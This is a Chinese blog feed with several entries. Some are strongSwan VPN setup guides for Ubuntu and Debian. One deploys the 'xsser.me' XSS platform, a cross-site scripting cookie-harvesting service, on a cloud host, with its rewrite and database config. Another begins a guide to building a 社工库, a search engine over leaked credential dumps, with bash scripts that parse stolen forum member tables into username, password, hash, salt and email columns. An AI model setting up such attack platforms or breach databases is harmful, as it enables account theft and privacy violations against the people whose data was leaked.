<div class="codehilite"><br><pre>ipsec pki –gen –type rsa –size 2048 \<br>–outform pem &gt; private/clientAABBKey.pem<br><br>ipsec pki –pub –in private/clientAABBKey.pem –type rsa | \<br>ipsec pki –issue –lifetime 730 \<br>–cacert cacerts/strongSwanCACert.pem \<br>–cakey private/strongSwanCAKey.pem \<br>–dn “C=CH, O=strongSwan, CN=aabb@myvpn.domain” \<br>–san aabb@myvpn.domain \<br>–outform pem &gt; certs/clientAABBCert.pem<br></pre><br></div><br>为了方便在Win7和IOS客户端上使用，我们把根证书和客户端的密钥+证书打包成一个<a href="http://en.wikipedia.org/wiki/PKCS_12" target="_blank" rel="external">PKCS #12</a>文件。这一步会提示输入密码，也可以留空。<br><div class="codehilite"><br><pre>openssl pkcs12 -export -inkey private/clientAABBKey.pem \<br>-in certs/clientAABBCert.pem -name “AABB’s Client Certificate” \<br>-certfile cacerts/strongSwanCACert.pem \<br>-caname “strongSwan Root CA” \<br>-out private/clientAABB.p12<br></pre><br></div>

<h3 id="设置密钥和证书权限"><a href="#设置密钥和证书权限" class="headerlink" title="设置密钥和证书权限"></a>设置密钥和证书权限</h3><p><strong>记得</strong>设置一下证书目录和文件的权限:</p>
<div class="codehilite"><br><pre>chmod 700 cacerts certs private crls<br>chmod 600 cacerts/<em> certs/</em> private/<em><br></em></pre><br></div><br>最后，罗列一下刚刚创建的密钥和证书:<br><div class="codehilite"><br><pre>cacerts/:<br>    strongSwanCACert.pem        –   根证书，用于签署服务端和客户端的证书<br><br>certs/:<br>    clientAABBCert.pem          –  <em> 客户端aabb的证书<br>    strongSwanServerCert.pem    –  服务端的证书<br><br>private/:<br>    strongSwanCAKey.pem         –  根证书的密钥<br>    clientAABBKey.pem           –  </em> 客户端aabb的密钥<br>    clientAABB.p12              –  <em> 根证书+客户端密钥+客户端证书<br>    strongSwanServerKey.pem     –  服务端的密钥<br></em></pre><br></div><br>上面加()号的都是需要下载到客户端安装的文件。<br><br>### 吊销客户端证书<br><br>有时候可能想吊销AABB客户端的证书，可以使用如下命令:<br><div class="codehilite"><br><pre>ipsec pki –signcrl –reason key-compromise \<br>–cacert cacerts/strongSwanCACert.pem \<br>–cakey private/strongSwanCAKey.pem \<br>–cert certs/clientAABBCert.pem \<br>–outform pem &gt; crls/crl.pem<br></pre><br></div><br>如果还想吊销一个客户端证书，参考这篇<a href="https://www.zeitgeist.se/2013/11/22/strongswan-howto-create-your-own-vpn/" target="_blank" rel="external">教程</a>，需要先将老的crl.pem文件保存到一个临时文件里:<br><div class="codehilite"><br><pre>cp crls/crl.pem crl.pem.tmp<br><br>ipsec pki –signcrl –reason key-compromise \<br>–cacert cacerts/strongSwanCACert.pem \<br>–cakey private/strongSwanCAKey.pem \<br>–cert certs/StolenClientCert.pem \<br>–lastcrl crl.pem.tmp \<br>–outform pem &gt; crls/crl.pem<br><br>rm crl.pem.tmp<br></pre><br></div>

<h2 id="配置strongSwan"><a href="#配置strongSwan" class="headerlink" title="配置strongSwan"></a>配置strongSwan</h2><h3 id="ipsec-conf"><a href="#ipsec-conf" class="headerlink" title="ipsec.conf"></a>ipsec.conf</h3><p>ipsec.conf的详细参数说明可参考官方的<a href="https://wiki.strongswan.org/projects/strongswan/wiki/IpsecConf" target="_blank" rel="external">wiki</a>。</p>
<div class="codehilite"><br><pre>sudo cat &gt; /usr/local/etc/ipsec.conf &lt;&lt; EOF<br>config setup<br>    uniqueids=never<br><br>conn ubuntu-networkmanager-strongswan<br>    keyexchange=ikev2<br>    left=%defaultroute<br>    leftauth=pubkey<br>    leftsubnet=0.0.0.0/0<br>    leftcert=strongSwanServerCert.pem<br>    right=%any<br>    rightauth=pubkey<br>    rightsourceip=10.31.2.0/24<br>    rightcert=clientAABBCert.pem<br>    auto=add<br>EOF<br></pre><br></div><br>注意rightsourceip这里配置的ip段，稍后要添加iptables规则。<br><br>### ipsec.secrets<br><br>这里保存服务器证书的密钥和登录密码等内容，如果密钥有密码，也要在后面加上，详细说明见<a href="https://wiki.strongswan.org/projects/strongswan/wiki/IpsecSecrets" target="_blank" rel="external">官方文档</a>。<br><div class="codehilite"><br><pre>sudo cat &gt; /usr/local/etc/ipsec.secrets &lt;&lt; EOF<br>: RSA strongSwanServerKey.pem<br>: PSK “A quick bRown FOX jumps”<br>: XAUTH “0ver a Lazy 0ld Dog”<br>aabb %any : EAP “BBAA”<br>EOF<br></pre><br></div>

<h3 id="strongswan-conf"><a href="#strongswan-conf" class="headerlink" title="strongswan.conf"></a>strongswan.conf</h3><p>配置strongswan，官方文档见<a href="https://wiki.strongswan.org/projects/1/wiki/StrongswanConf" target="_blank" rel="external">这里</a>。</p>
<div class="codehilite"><br><pre>sudo cat &gt; /usr/local/etc/strongswan.conf &lt;&lt; EOF<br>charon {<br>    load_modular = yes<br>    duplicheck.enable = no<br>    compress = yes<br>    plugins {<br>        include strongswan.d/charon/<em>.conf<br>    }<br>    dns1 = 8.8.8.8<br>    dns2 = 8.8.4.4<br>    nbns1 = 8.8.8.8<br>    nbns2 = 8.8.4.4<br>}<br>include strongswan.d/</em>.conf<br>EOF<br></pre><br></div>

<h3 id="charon-logging-conf"><a href="#charon-logging-conf" class="headerlink" title="charon-logging.conf"></a>charon-logging.conf</h3><p>strongswan的默认配置会把日志写到系统日志里，可以参考<a href="https://wiki.strongswan.org/projects/strongswan/wiki/LoggerConfiguration" target="_blank" rel="external">官方文档</a>将日志写入一个单独的文件。</p>
<div class="codehilite"><br><pre>sudo cat &gt; /usr/local/etc/strongswan.d/charon-logging.conf &lt;&lt; EOF<br>charon {<br>    filelog {<br>        /var/log/strongswan.log {<br>            append = yes<br>            default = 1<br>            flush_line = yes<br>            ike_name = yes<br>            time_format = %b %e %T<br>        }<br>    }<br>}<br>EOF<br></pre><br></div>

<h2 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h2><h3 id="ip转发"><a href="#ip转发" class="headerlink" title="ip转发"></a>ip转发</h3><p>修改<code>/etc/sysctl.conf</code>，启用ip转发，取消注释。</p>
<div class="codehilite"><br><pre>net.ipv4.ip_forward = 1<br></pre><br></div><br>然后导入配置<br><div class="codehilite"><br><pre>sudo sysctl -p<br></pre><br></div>

<h3 id="iptables配置"><a href="#iptables配置" class="headerlink" title="iptables配置"></a>iptables配置</h3><p>先备份下当前的配置:</p>
<div class="codehilite"><br><pre>sudo iptables-store &gt; ~/iptables.rules<br></pre><br></div><br>用下面的命令确认下网络接口，如果不是eth0，注意替换成实际的接口。<br><div class="codehilite"><br><pre>ip route show | grep ‘^default’ | sed -e ‘s/.<em> dev ([^ ]</em>).*/\1/‘<br></pre><br></div><br>添加如下规则:<br><div class="codehilite"><br><pre>iptables -A FORWARD -m state –state RELATED,ESTABLISHED -j ACCEPT<br>iptables -A FORWARD -s 10.31.2.0/24  -j ACCEPT<br>iptables -A INPUT -i eth0 -p esp -j ACCEPT<br>iptables -A INPUT -i eth0 -p udp –dport 500 -j ACCEPT<br>iptables -A INPUT -i eth0 -p tcp –dport 500 -j ACCEPT<br>iptables -A INPUT -i eth0 -p udp –dport 4500 -j ACCEPT<br>iptables -A FORWARD -j REJECT<br>iptables -t nat -A POSTROUTING -s 10.31.2.0/24 -o eth0 -j MASQUERADE<br><br># 解决有的网站无法访问的问题<br>iptables -t mangle -A FORWARD -o eth0 -p tcp -m tcp \<br>–tcp-flags SYN,RST SYN -m tcpmss –mss 1361:1536 \<br>-j TCPMSS –set-mss 1360<br></pre><br></div>

<h2 id="启动strongSwan服务"><a href="#启动strongSwan服务" class="headerlink" title="启动strongSwan服务"></a>启动strongSwan服务</h2><p>启动和停止服务</p>
<div class="codehilite"><br><pre>sudo ipsec start<br>sudo ipsec stop<br></pre><br></div><br>也可以下载一个init脚本:<br><div class="codehilite"><br><pre>sudo wget -O /etc/init.d/strongswan \<br><a href="https://raw.githubusercontent.com/strongswan/strongswan/master/packages/strongswan/debian/strongswan-starter.ipsec.init" target="_blank" rel="external">https://raw.githubusercontent.com/strongswan/strongswan/master/packages/strongswan/debian/strongswan-starter.ipsec.init</a><br><br># 改一下ipsec的路径并添加执行权限<br>sudo sed -i ‘s|DAEMON=/usr/sbin|DAEMON=/usr/local/sbin|’ /etc/init.d/strongswan<br>sudo chmod +x /etc/init.d/strongswan<br></pre><br></div><br>以后就可以用service命令启动了<br><div class="codehilite"><br><pre>sudo service strongswan start<br>sudo service strongswan stop<br>sudo service strongswan restart<br></pre><br></div>

<h2 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h2><p>以Ubuntu 14.04为例，安装以下软件包:</p>
<div class="codehilite"><br><pre>sudo apt-get install network-manager-strongswan<br></pre><br></div><br>然后会自动安装相应的依赖包。注意strongswan和openswan不兼容，如果之前安装过openswan则会自动被卸载，相应的，l2tp vpn也会无法再使用。<br><br>可参考官方的NetworkManager<a href="https://wiki.strongswan.org/projects/strongswan/wiki/NetworkManager" target="_blank" rel="external">配置说明</a>。<br><br>## 常见问题<br><br>### Necessary secrets not provided<br><br>使用ubuntu的NetworkManager创建的strongSwan vpn连接(pubkey)报错:<br><div class="codehilite"><br><pre>Necessary secrets for the VPN connection were not provided.<br></pre><br></div><br>问题应该是NetworkManager没法从gnome-keyring获取密钥的密码引起的，安装完network-manager-strongswan包后重启下客户端操作系统(或者直接重启gnome-keyring-daemon服务)。<br><br>### 有的网站无法访问<br><br>问题表现为有的网站能正常访问，而有的网站死活刷不出来，在服务器端使用tcpdump可以捕获到如下错误:<br><div class="codehilite"><br><pre> ICMP xxx.xxx.xxx.xxx unreachable - need to frag (mtu 1422), length 556<br></pre><br></div><br>应该就是所谓的<a href="https://www.zeitgeist.se/2013/11/26/mtu-woes-in-ipsec-tunnels-how-to-fix/" target="_blank" rel="external">mtu问题</a>。<br><br>解决方法参考上面的文章，添加一条iptables规则:<br><div class="codehilite"><br><pre>iptables -t mangle -A FORWARD -o eth0 -p tcp -m tcp \<br>–tcp-flags SYN,RST SYN -m tcpmss –mss 1361:1536 \<br>-j TCPMSS –set-mss 1360<br></pre><br></div><br>注意，接口<code>-o eth0</code>一定要设置对，俺就在这里被坑了很久。<br><br>### 无法访问外部网站或IP<br><br>首先考虑配置（证书）是否正确，从命令行启动，看是否有什么异常输出。<br><div class="codehilite"><br><pre>sudo ipsec start<br># conn1 是/usr/local/etc/ipsec.conf里conn的名字<br>sudo ipsec up conn1<br></pre><br></div><br>其次，检查服务端的iptables是否正确配置，特别是接口是否配置正确，比如eth1写成了eth0。<br><br>## 参考资料<a href="http://blog.atime.me/note/strongSwan-setup-and-config-on-ubuntu-server.html#35808e" target="_blank" rel="external">¶</a><br><br><em>   <a href="https://hjc.im/shi-yong-strongswanda-jian-ipsecikev2-vpn/" target="_blank" rel="external">使用Strongswan搭建IPSec/IKEv2 VPN</a>
</em>   <a href="https://www.zeitgeist.se/2013/11/22/strongswan-howto-create-your-own-vpn/" target="_blank" rel="external">strongSwan 5: How to create your own private VPN</a><br>*   <a href="https://wiki.strongswan.org/projects/strongswan/wiki/SimpleCA" target="_blank" rel="external">Setting-up a Simple CA Using the strongSwan PKI Tool</a><br><br>## 脚注<a href="http://blog.atime.me/note/strongSwan-setup-and-config-on-ubuntu-server.html#content-references" target="_blank" rel="external">¶</a><br><br><div class="footnote"><br><br>1.  可以安装<code>virt-what</code>包来查看VPS使用的虚拟化技术。<br>2.  <a href="https://wiki.strongswan.org/projects/strongswan/wiki/Win7CertReq" target="_blank" rel="external">strongSwan Wiki#Requirements for certificates used with Windows 7</a>. 2015.04.08<br>3.  <a href="https://wiki.strongswan.org/projects/strongswan/wiki/IOS_%28Apple%29#Certificate-requirements-for-iOS-interoperability" target="_blank" rel="external">strongSwan Wiki#Certificate requirements for iOS interoperability</a>. 2015.04.08<br></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录在Ubuntu 14.04上安装和配置strongSwan的过程。&lt;/p&gt;
&lt;p&gt;装完之后才发现只能在墙内翻腾，一番调查后发现客户端的IKE_AUTH包根本无法到达墙外的服务端，改端口也没用。不过好歹也折腾了一番，姑且记下来。&lt;/p&gt;
&lt;h2 id=&quot;编译安装stron
    
    </summary>
    
      <category term="记录" scheme="http://www.linux52.com/categories/%E8%AE%B0%E5%BD%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Debian 8 设置IPSEC Strongswan</title>
    <link href="http://www.linux52.com/2016-06-15-debian-8-e8-ae-be-e7-bd-aeipsec-strongswan.html"/>
    <id>http://www.linux52.com/2016-06-15-debian-8-e8-ae-be-e7-bd-aeipsec-strongswan.html</id>
    <published>2016-06-15T14:54:24.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>Debian 8 出来了，可是openswan 也没人维护了，之前配置的L2TP直接报废，强制安装降级openswan 不是个办法，刚好看到strongswan 维护的很好，貌似支持IOS8的CISCO VPN， 干脆就试验一把, 参考了这个文章里的配置，不过我其实用不到证书，也非常麻烦，所以作了一些改进，不过证书方面还是按照这篇文章里面的设置了。<br><a href="https://www.zeitgeist.se/2013/11/22/strongswan-howto-create-your-own-vpn/" target="_blank" rel="external">https://www.zeitgeist.se/2013/11/22/strongswan-howto-create-your-own-vpn/</a></p>
<p>首先当然是要安装stongswan 拉</p>
<p><code>apt-get install strongswan libcharon-extra-plugins</code></p>
<p>经过实验，Debian 7 也是完美支持的不过要特别安装</p>
<pre><code># echo &quot;deb http://ftp.debian.org/debian wheezy-backports main&quot; \
    &amp;gt; /etc/apt/sources.list.d/wheezy-backports.list
# apt-get update
# apt-get -t wheezy-backports install strongswan libcharon-extra-plugins
`&lt;/pre&gt;
然后检查一下ipsec的版本是不是安装好了

`ipsec version`

接下来就是建立Strongswan 密钥和证书了
&lt;pre&gt;`# cd /etc/ipsec.d/
# ipsec pki --gen --type rsa --size 4096 \
    --outform pem \
    &amp;gt; private/strongswanKey.pem
# chmod 600 private/strongswanKey.pem
# ipsec pki --self --ca --lifetime 3650 \
    --in private/strongswanKey.pem --type rsa \
    --dn &quot;C=CH, O=strongSwan, CN=strongSwan Root CA&quot; \
    --outform pem \
    &amp;gt; cacerts/strongswanCert.pem
`&lt;/pre&gt;
然后是服务器端的证书 替换文章中的vpn.zeitgeist.se 为自己服务器的域名，如果域名不一致会造成无法连接。
&lt;pre&gt;`# cd /etc/ipsec.d/
# ipsec pki --gen --type rsa --size 2048 \
    --outform pem \
    &amp;gt; private/vpnHostKey.pem
# chmod 600 private/vpnHostKey.pem
# ipsec pki --pub --in private/vpnHostKey.pem --type rsa | \
    ipsec pki --issue --lifetime 730 \
    --cacert cacerts/strongswanCert.pem \
    --cakey private/strongswanKey.pem \
    --dn &quot;C=CH, O=strongSwan, CN=vpn.zeitgeist.se&quot; \
    --san vpn.zeitgeist.se \
    --flag serverAuth --flag ikeIntermediate \
    --outform pem &amp;gt; certs/vpnHostCert.pem
`&lt;/pre&gt;
然后就是生成客户端证书了， 我生成了但是没有用， 只要ios上vpn， 可以用cisco的密码连接而不用证书， 文章里也生成了p12 证书，也是比较方便。
&lt;pre&gt;`# cd /etc/ipsec.d/
# ipsec pki --gen --type rsa --size 2048 \
    --outform pem \
    &amp;gt; private/AlexanderKey.pem
# chmod 600 private/AlexanderKey.pem
# ipsec pki --pub --in private/AlexanderKey.pem --type rsa | \
    ipsec pki --issue --lifetime 730 \
    --cacert cacerts/strongswanCert.pem \
    --cakey private/strongswanKey.pem \
    --dn &quot;C=CH, O=strongSwan, CN=alexander@zeitgeist.se&quot; \
    --san alexander@zeitgeist.se \
    --outform pem &amp;gt; certs/AlexanderCert.pem

# cd /etc/ipsec.d/
# openssl pkcs12 -export -inkey private/AlexanderKey.pem \
    -in certs/AlexanderCert.pem -name &quot;Alexander&apos;s VPN Certificate&quot; \
    -certfile cacerts/strongswanCert.pem \
    -caname &quot;strongSwan Root CA&quot; \
    -out Alexander.p12
`&lt;/pre&gt;
接下来就是关键中的关键了。 ipsec的配置 修改ipsec.conf 相对于原文章我主要修改了这段 conn CiscoIPSec 让普通的IOS CISCO 客户端通过密码也可以联入IPSEC VPN
&lt;pre&gt;`# ipsec.conf - strongSwan IPsec configuration file

config setup  
    # uniqueids=never
    charondebug=&quot;cfg 2, dmn 2, ike 2, net 2&quot;

conn %default  
    keyexchange=ikev2
    ike=aes128-sha256-ecp256,aes256-sha384-ecp384,aes128-sha256-modp2048,aes128-sha1-modp2048,aes256-sha384-modp4096,aes256-sha256-modp4096,aes256-sha1-modp4096,aes128-sha256-modp1536,aes128-sha1-modp1536,aes256-sha384-modp2048,aes256-sha256-modp2048,aes256-sha1-modp2048,aes128-sha256-modp1024,aes128-sha1-modp1024,aes256-sha384-modp1536,aes256-sha256-modp1536,aes256-sha1-modp1536,aes256-sha384-modp1024,aes256-sha256-modp1024,aes256-sha1-modp1024!
    esp=aes128gcm16-ecp256,aes256gcm16-ecp384,aes128-sha256-ecp256,aes256-sha384-ecp384,aes128-sha256-modp2048,aes128-sha1-modp2048,aes256-sha384-modp4096,aes256-sha256-modp4096,aes256-sha1-modp4096,aes128-sha256-modp1536,aes128-sha1-modp1536,aes256-sha384-modp2048,aes256-sha256-modp2048,aes256-sha1-modp2048,aes128-sha256-modp1024,aes128-sha1-modp1024,aes256-sha384-modp1536,aes256-sha256-modp1536,aes256-sha1-modp1536,aes256-sha384-modp1024,aes256-sha256-modp1024,aes256-sha1-modp1024,aes128gcm16,aes256gcm16,aes128-sha256,aes128-sha1,aes256-sha384,aes256-sha256,aes256-sha1!
    dpdaction=clear
    dpddelay=300s
    rekey=no
    left=%any
    leftsubnet=0.0.0.0/0
    leftcert=vpnHostCert.pem
    right=%any
    rightdns=8.8.8.8,8.8.4.4
    rightsourceip=172.16.16.0/24

conn IPSec-IKEv2  
    keyexchange=ikev2
    auto=add

conn IPSec-IKEv2-EAP  
    also=&quot;IPSec-IKEv2&quot;
    rightauth=eap-mschapv2
    rightsendcert=never
    eap_identity=%any

conn CiscoIPSec  
        keyexchange=ikev1
        leftsendcert=never
        #do not need server side cert
        leftauth=psk
        rightauth=psk
        #use PSK as client server auth type
        rightauth2=xauth
        #use xauth as user login auth type
        auto=add
`&lt;/pre&gt;
接着修改密码文件， 替换中间 topsecretpassword1， topsecretpassword2 ，evenmoretopsecretpassword 到自己设定的密码就可以了。
&lt;pre&gt;`/etc/ipsec.secrets

： PSK &quot;topsecretpassword1&quot;
: RSA vpnHostKey.pem
user1 : EAP &quot;topsecretpassword2&quot;  
user1 : XAUTH &quot;evenmoretopsecretpassword&quot;  
`&lt;/pre&gt;
然后热倒入一下密码

`#ipsec rereadsecrets`

一般这样就七七八八差不多了， 最后就是给iptables 设置规则， 最简单的就是IPV4 转发, xxx.xxx.xxx.xxx 改成服务器IP。
&lt;pre&gt;`# echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward
# echo 0 &amp;gt; /proc/sys/net/ipv4/conf/all/accept_redirects
# echo 0 &amp;gt; /proc/sys/net/ipv4/conf/all/send_redirects
# iptables -t nat -A POSTROUTING -o eth0 ! -p esp \
    -j SNAT --to-source xxx.xxx.xxx.xxx

# iptables -A INPUT -p udp --dport 500 --j ACCEPT
# iptables -A INPUT -p udp --dport 4500 --j ACCEPT
# iptables -A INPUT -p esp -j ACCEPT
</code></pre><p>最后，重起一下 ipsec 吧，万事俱备了。</p>
<p><code># service ipsec restart</code></p>
<p>IOS8 CISCO 客户端的配置就非常方便了<br>新建VPN 并设置Cisco 类型，填入服务器地址，用户名，密码和PSK 密码，就可以以不需要客户端证书而是直接密码方式进行VPN连接了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Debian 8 出来了，可是openswan 也没人维护了，之前配置的L2TP直接报废，强制安装降级openswan 不是个办法，刚好看到strongswan 维护的很好，貌似支持IOS8的CISCO VPN， 干脆就试验一把, 参考了这个文章里的配置，不过我其实用不到证
    
    </summary>
    
      <category term="debian" scheme="http://www.linux52.com/categories/debian/"/>
    
    
  </entry>
  
  <entry>
    <title>如何在sea安装xsser.me</title>
    <link href="http://www.linux52.com/2016-05-16-e5-a6-82-e4-bd-95-e5-9c-a8sea-e5-ae-89-e8-a3-85xsser-me.html"/>
    <id>http://www.linux52.com/2016-05-16-e5-a6-82-e4-bd-95-e5-9c-a8sea-e5-ae-89-e8-a3-85xsser-me.html</id>
    <published>2016-05-16T07:53:23.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>源码看这个<a href="http://zone.wooyun.org/content/13519" target="_blank" rel="external">http://zone.wooyun.org/content/13519</a></p>
<p><a href="http://dg2016.duapp.com/wp-content/uploads/2016/05/2016051607505923.zip" target="_blank" rel="external">xss平台源码（邮件提醒，飞信短信提醒，短网址，Bootstrap框架）</a></p>
<p>1.创一个空的php应用（不用多说了 mysql初始化）<br>2.本地先架设好测试成功代码（因为sea上没有权限所以。。。）</p>
<h1 id="3-把测试好的代码打包好zip"><a href="#3-把测试好的代码打包好zip" class="headerlink" title="3.把测试好的代码打包好zip"></a>3.把测试好的代码打包好zip</h1><p>sea平台操作</p>
<p>控至台===》sea应用管理===&gt;&gt;应用===》代码管理===》创建版本====》上传你本地的code.zip</p>
<p><strong>这里为什么不用svn 尼玛传不了说什么出错我也搞不明白 我还在社区请教了都没人回</strong></p>
<p>结下来就是倒入sql数据 修改rewite规测 和配至文件</p>
<pre class="prettyprint linenums">
config.yml
handle:
- rewrite: if ( !is_dir() && !is_file() && path ~ "^/([0-9a-zA-Z]{6})$" ) goto "/index.php?do=code&urlKey=$1"
- rewrite: if ( !is_dir() && !is_file() && path ~ "^/do/auth/(\w+?)(/domain/([\w\.]+?))?$" ) goto "/index.php?do=do&auth=$1&domain=$3"
- rewrite: if ( !is_dir() && !is_file() && path ~ "^/register/(.*?)$" ) goto "/index.php?do=register&key=$1"
- rewrite: if ( !is_dir() && !is_file() && path ~ "^/register-validate/(.*?)$" ) goto "/index.php?do=register&act=validate&key=$1"
- errordoc:  404 /index.html
- errordoc:  200 /index.php
- errordoc:  403 /index.html
</pre>
config.php
<pre class="prettyprint linenums">
/* 数据库连接 */
$config['dbHost']    = SAE_MYSQL_HOST_M.':'.SAE_MYSQL_PORT;  //数据库地址
$config['dbUser']    = SAE_MYSQL_USER;        //用户
$config['dbPwd']    = SAE_MYSQL_PASS;        //密码
$config['database']    = SAE_MYSQL_DB;      //数据库名
$config['charset']    ='utf8';        //数据库字符集
$config['tbPrefix']    ='oc_';          //表名前缀
$config['dbType']    ='mysql';        //数据库类型(目前只支持mysql)
</pre>

<p>好了这样就可以了 重点就是  $config[‘dbHost’]    = SAE_MYSQL_HOST_M.’:’.SAE_MYSQL_PORT;  //数据库地址<br>搞了N久原来没有PORT写入死活不行</p>
<p>现在正常了 可以收信HOHO 源码自代的</p>
<p>PS：话说sea好贵的 明天等我bae认证下来拿到bae上测试下<br>另求牛逼的XSS平台源码</p>
<p>上测试图<a href="http://dg2016.duapp.com/wp-content/uploads/2016/05/2016051607525339.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2016/05/2016051607525339.png" alt="12"></a><a href="http://dg2016.duapp.com/wp-content/uploads/2016/05/2016051607515199.png" target="_blank" rel="external"><img src="http://dg2016.duapp.com/wp-content/uploads/2016/05/2016051607515199.png" alt="11"></a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;源码看这个&lt;a href=&quot;http://zone.wooyun.org/content/13519&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://zone.wooyun.org/content/13519&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a hre
    
    </summary>
    
      <category term="记录" scheme="http://www.linux52.com/categories/%E8%AE%B0%E5%BD%95/"/>
    
    
  </entry>
  
  <entry>
    <title>如何设计搭建一个社工库</title>
    <link href="http://www.linux52.com/2016-03-21-e5-a6-82-e4-bd-95-e8-ae-be-e8-ae-a1-e6-90-ad-e5-bb-ba-e4-b8-80-e4-b8-aa-e7-a4-be-e5-b7-a5-e5-ba-93.html"/>
    <id>http://www.linux52.com/2016-03-21-e5-a6-82-e4-bd-95-e8-ae-be-e8-ae-a1-e6-90-ad-e5-bb-ba-e4-b8-80-e4-b8-aa-e7-a4-be-e5-b7-a5-e5-ba-93.html</id>
    <published>2016-03-21T13:16:28.000Z</published>
    <updated>2016-10-11T15:06:06.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://le4f.net/post/post/build-social-engineer-evildata-search-engine" target="_blank" rel="external">http://le4f.net/post/post/build-social-engineer-evildata-search-engine</a></p>
<h4 id="如何设计搭建一个社工库"><a href="#如何设计搭建一个社工库" class="headerlink" title="如何设计搭建一个社工库"></a>如何设计搭建一个社工库</h4><p>从初起设计一个社工库，到现在的Beta，前前后后零零整整花了不下一个月的时间，林林总总记录下来，留给需要之人</p>
<p>泄露数据库格式不一，长相奇葩，因需将用户名、密码、邮箱、哈希等信息按表分列入库，故整理数据是很耗时间的一步</p>
<h5 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h5><p>选择了Debian x64+Mysql+Mysqlcft+Sphinx+Nginx+PHP</p>
<p>轻量的sqlite数据库，但查询速度及空间消耗过大，对请求时sqlite处理效率较差</p>
<p>mangodb，但mangodb在分布计算中有更好的优势而在社工库搭建中优势并不明显</p>
<p>在mysql和postgresql中，选择历久弥新的mysql</p>
<p>为方便社工库移植，使用VM建一个虚拟机，所有数据库均在虚拟机中，LNMP环境对外只提供PHP查询接口</p>
<p>实际测试中，CentOS6.4虚拟机中因断电损失过多数据，并不如预想中稳定，且对CoreSeek版本较老的mmseg中文分词编译会出现各种各样的问题，难以解决。32位的操作系统在sphinx单个索引大小上会有限制，几次折腾后还是迁回了Debian7 X64</p>
<h5 id="整理数据"><a href="#整理数据" class="headerlink" title="整理数据"></a>整理数据</h5><p>一般使用bash脚本完成。DEMO：</p>
<p>普通格式：</p>
<pre><code>#!/bin/bash
sed &apos;/^[ \t]\{0,\}$/d&apos; $1  sed &apos;s/[\t ]/\t/g&apos;  sed &apos;s/\r//g&apos; sed &apos;/^\s*$/d&apos;  awk -F&quot;\t&quot; &apos;{print &quot;NULL&quot;$1&quot;&quot;$2&quot;&quot;$1&quot;xxxx&quot; }&apos;  iconv -c -f gb18030 -t UTF-8  sort  uniq 
he`&lt;/pre&gt;
UCmember格式：
&lt;pre&gt;`#!/bin/bash
sed &apos;s/[\r\n ]//g&apos; $1  tr -d &apos;\n&apos;  sed &quot;s/INSERTINTO\`bbs\_uc\_members\`VALUES(//g&quot;  sed &quot;s/&apos;,&apos;/\t/g&quot;  sed &quot;s/,&apos;/\t/g&quot;  sed &quot;s/&apos;,/\t/g&quot; sed &quot;s/&apos;);/\n/g&quot;  awk -F&quot;\t&quot; &apos;{ print &quot;NULL&quot;$2&quot;&quot;$3&quot;&quot;$9&quot;&quot;$4&quot;&quot;$7&quot;xxxx+xxxx+evil++&quot;}&apos;  sed &quot;/+evil++/d&quot;`&lt;/pre&gt;
PW_MEMBER格式：
&lt;pre&gt;`#!/bin/bash
sed &apos;s/[\r\n ]//g&apos; $1  tr -d &apos;\n&apos;  sed &quot;s/INSERTINTO\`pw_members\`VALUES(&apos;/\n/g&quot;  sed &quot;s/&apos;,&apos;/\t/g&quot;  awk -F&quot;\t&quot; &apos;{ print $1&quot;&quot;$2&quot;&quot;$3&quot;&quot;$5&quot;xxxx&quot;}&apos;  sed &quot;/+evil++/d&quot;`&lt;/pre&gt;
文件内格式不同的处理脚本eg：
&lt;pre&gt;`#!/bin/bash
sed &apos;s/\r//g&apos; $1  sed &quot;s/&apos;/[fenhao]/g&quot;  sed &apos;s/[ \t]\{1,\}/\t/g&apos;  sed &apos;s/-/\t/g&apos;  awk -F &quot;\t&quot; &apos;{ if ($2~/@163.com/)
{
if ($3~/^$/) {print &quot;NULL&quot;$1&quot;&quot;$2$3&quot;&quot;}
else {print &quot;NULL&quot;$1&quot;&quot;$3&quot;&quot;}
}
else
{print &quot;NULL&quot;$1&quot;&quot;$2&quot;&quot;}
}&apos;  iconv -c -f gb18030 -t UTF-8  sort  uniq`&lt;/pre&gt;
批量按行导入：
&lt;pre&gt;`#!/bin/bash
sed &apos;/^[ \t]\{0,\}$/d&apos; $1  sed &apos;s/\r//g&apos;  sed &apos;/^\s*$/d&apos;  awk &apos;{print &quot;NULL&quot;$0&quot;xxxx&quot; }&apos;`&lt;/pre&gt;
对于数据库设计也尤为重要。测试后、按表存储、单表记录数不超过3W，否则建全文索引时间过长。

##### 库表设计

&lt;pre&gt;`CREATE TABLE `evil_xxxx_1` (
`id` INT( 10 ) NOT NULL AUTO_INCREMENT,
`username` VARCHAR( 64 ) ,
`password` VARCHAR( 64 ) ,
`passhash` VARCHAR( 64 ) ,
`email` VARCHAR( 64 )
);

CREATE TABLE `evil_ucmember_1` (
`id` INT( 10 ) NOT NULL AUTO_INCREMENT,
`username` VARCHAR( 64 ) ,
`password` VARCHAR( 64 ) ,
`passhash` VARCHAR( 64 ) ,
`salt` VARCHAR( 16 ) ,
`email` VARCHAR( 64 ) ,
`ip` VARCHAR( 32 ) ,
`site` VARCHAR( 64 ) ,
PRIMARY KEY (id)
);

CREATE TABLE `evil_multinfo_1` (
`id` INT( 10 ) NOT NULL AUTO_INCREMENT,
`info` VARCHAR( 1024 ) ,
`site` VARCHAR( 64 ) ,
PRIMARY KEY (id)
);`&lt;/pre&gt;
分表的一个方案：
&lt;pre&gt;`INSERT INTO evil_xx_1(evil_xx.id,evil_xx.username,evil_xx.password,evil_xx.passhash) SELECT (evil_xx.id,evil_xx.username,evil_xx.password,evil_xx.passhash)FROM evil_xx where user.id &amp;lt;= 30;`&lt;/pre&gt;

##### 命令查询

